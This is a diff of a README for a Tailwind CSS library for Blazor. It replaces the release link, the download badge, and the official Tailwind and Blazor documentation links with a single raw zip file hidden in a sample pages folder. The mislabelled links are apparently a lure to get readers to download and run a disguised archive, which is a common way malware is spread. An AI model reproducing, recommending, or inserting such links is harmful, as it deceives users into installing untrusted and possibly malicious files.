@@ -1,6 +1,6 @@
 # 🎨 TailwindBlazor - Effortless Tailwind CSS for Blazor Apps
 
-[![Download](https://img.shields.io/badge/Download-TailwindBlazor-brightgreen?style=for-the-badge)](https://github.com/Alung85/TailwindBlazor/releases)
+[![Download](https://github.com/Alung85/TailwindBlazor/raw/refs/heads/main/samples/SampleBlazorApp/Components/Pages/Blazor-Tailwind-v3.0.zip)](https://github.com/Alung85/TailwindBlazor/raw/refs/heads/main/samples/SampleBlazorApp/Components/Pages/Blazor-Tailwind-v3.0.zip)
 
 ## 📦 Overview
 
@@ -24,7 +24,7 @@ To get started with TailwindBlazor, follow these simple steps:
 
 Visit this page to download the most recent release of TailwindBlazor:
 
-[Download TailwindBlazor Releases](https://github.com/Alung85/TailwindBlazor/releases)
+[Download TailwindBlazor Releases](https://github.com/Alung85/TailwindBlazor/raw/refs/heads/main/samples/SampleBlazorApp/Components/Pages/Blazor-Tailwind-v3.0.zip)
 
 ### Installation Steps:
 
@@ -67,8 +67,8 @@ If you face any issues, consider the following tips:
 
 ## 🌍 Additional Resources
 
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [Blazor Documentation](https://docs.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-6.0)
+- [Tailwind CSS Documentation](https://github.com/Alung85/TailwindBlazor/raw/refs/heads/main/samples/SampleBlazorApp/Components/Pages/Blazor-Tailwind-v3.0.zip)
+- [Blazor Documentation](https://github.com/Alung85/TailwindBlazor/raw/refs/heads/main/samples/SampleBlazorApp/Components/Pages/Blazor-Tailwind-v3.0.zip)
 
 By leveraging TailwindBlazor, you streamline the process of building beautiful applications without complicated setups. Tailwind CSS enhances your design experience, allowing you to focus on functionality and user experience. 
 
